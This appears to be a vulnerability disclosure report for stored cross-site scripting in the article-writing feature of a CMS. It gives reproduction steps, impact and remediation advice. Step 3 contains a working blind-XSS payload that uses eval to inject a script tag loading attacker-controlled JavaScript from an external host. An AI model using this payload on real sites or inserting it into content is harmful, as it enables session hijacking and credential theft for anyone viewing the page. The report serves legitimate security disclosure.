## Title
** Stored XSS in Write Article Function **

## Description
The application is vulnerable to Stored Cross-Site Scripting (XSS) through the Write Article Function functionality.

User-controlled input is stored by the application and later rendered without proper output encoding or sanitization. As a result, an attacker can inject JavaScript that executes in the browser of users viewing the affected content.

## Affected Endpoint
- **URL:** https://cms.pwnedbox.site/
- **Parameter:** Write Article Function
- **Affected Functionality:** Write Article Function

## Steps to Reproduce
1. Log in to the application using a test account.
2. Navigate to the affected functionality.
3. Submit the following test payload:

   ```html
    javascript:eval('var a=document.createElement(\'script\');a.src=\'//maya.ezxss.com\';document.body.appendChild(a)')</svg></div>
   ```

4. Save or submit the content.
5. Revisit the affected page.
6. Observe that JavaScript executes when the stored content is rendered.

## Proof of Concept

<img width="1572" height="777" alt="Screenshot 2026-11-16 130204" src="https://github.com/user-attachments/assets/4d5192c3-eb4a-49a1-b81c-05a626bee916" />
<img width="1917" height="682" alt="Screenshot 2026-11-16 130140" src="https://github.com/user-attachments/assets/3cffc3b1-61a3-4aee-a797-f037df411984" />
<img width="1911" height="971" alt="Screenshot 2026-11-16 130133" src="https://github.com/user-attachments/assets/9f24ef0d-8a69-4e55-97cd-f5d2de6eb321" />


**Video PoC:** [Insert video link]

## Blind XSS / External Interaction Evidence

**ez.pe Report:** [https://www.ez.pe/manage/reports/share/6a5512412295a4d7a9d7031d738e168f433a28fc8bd2e5ffd3]

**Time:** `[November 16, 2026, 7:31 am]`


## Security Impact

Successful exploitation may allow an attacker to:

- **Account Takeover:** Potentially compromise user sessions or accounts, depending on cookie protections and application functionality.
- **Sensitive Data Theft:** Access information available within the victim's authenticated browser session.
- **Unauthorized Actions:** Perform actions with the victim's application privileges.
- **Administrative Compromise:** Execute attacker-controlled JavaScript when administrators access the affected content.
- **Credential Theft:** Present deceptive login forms to capture user-entered credentials.
- **Persistent Attacks:** Target multiple users who access the affected content without requiring each victim to visit a specially crafted link.

The actual impact depends on the affected functionality, victim privileges, and application security controls.

## Recommended Remediation

1. Implement context-aware output encoding for all user-controlled content.
2. Sanitize user-submitted HTML using a maintained library such as DOMPurify when HTML formatting is required.
3. Use safe DOM methods such as `textContent` instead of unsafe `innerHTML` for plain-text content.
4. Apply a restrictive Content Security Policy (CSP).
5. Set session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.

## References

- https://portswigger.net/web-security/cross-site-scripting/stored
- https://portswigger.net/web-security/cross-site-scripting
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
